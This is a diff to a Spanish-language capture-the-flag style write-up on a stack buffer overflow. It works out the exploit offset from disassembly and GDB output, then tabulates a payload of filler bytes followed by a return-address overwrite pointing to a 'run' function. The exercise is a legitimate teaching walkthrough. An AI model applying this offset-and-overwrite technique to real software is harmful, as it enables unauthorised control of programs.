@@ -154,13 +154,53 @@ Non-debugging symbols:
 0x08048444  run
 ```
 
-3. **Cáculo del PAyload (OFFSET):**
-Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la dirección de retorno:
+---
 
-1. **Buffer útil:** 64 bytes (hasta el final de la reserva local).
-2. **Padding/Alineación:** El compilador deja un hueco de 12 bytes adicionales en este caso específico entre el buffer y el EBP.
-3. **EBP Viejo:** 4 bytes.
-4. **EIP (Retorno):** Aquí inyectamos nuestra dirección.
+**3. Cálculo del Payload (OFFSET):**
+
+Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la dirección de retorno. El desensamblado nos da la información necesaria:
+
+```asm
+0x08048486 <+6>:    sub    esp,0x50
+0x08048489 <+9>:    lea    eax,[esp+0x10]
+```
+
+- `sub esp, 0x50` → El compilador reserva **80 bytes** (0x50) en el stack para el frame de `main()`.
+- `lea eax, [esp+0x10]` → El buffer donde `gets()` escribe empieza en `[esp+0x10]`, es decir, **16 bytes por encima del tope del stack**.
+
+Esto significa que los primeros 16 bytes del frame están reservados para el argumento que se pasa a `gets()` (la dirección del buffer en `[esp]`), y el buffer útil empieza después:
+
+```
+80 bytes (frame total) - 16 bytes (argumentos) = 64 bytes de buffer útil
+```
+
+Lo verificamos en GDB. Ponemos un breakpoint justo antes del `ret` y miramos dónde está el EBP respecto al inicio del buffer:
+
+```bash
+(gdb) b *0x08048495
+(gdb) run <<< $(python -c "print 'A'*64")
+(gdb) x/20x $esp
+```
+
+La distancia desde el inicio del buffer `[esp+0x10]` hasta el EBP guardado es:
+
+```
+64 bytes (buffer) + 12 bytes (padding/alineación del compilador) = 76 bytes
++ 4 bytes (EBP viejo) = 80 bytes  ← cierra exacto con el frame
+```
+
+Los **12 bytes de padding** son espacio que el compilador deja entre el final del buffer y el EBP guardado para mantener la alineación del stack. No contienen variables locales, son simplemente relleno.
+
+**Cálculo total:**
+
+| Offset | Contenido | Valor |
+|--------|-----------|-------|
+| **0 - 63** | Buffer | "A" * 64 |
+| **64 - 75** | Padding del compilador | "A" * 12 |
+| **76 - 79** | EBP viejo | "A" * 4 |
+| **80 - 83** | **Nuevo EIP** | `\x44\x84\x04\x08` |
+
+---
 
 4. **Cálculo total de caracteres basura (Padding):**
 bytes.
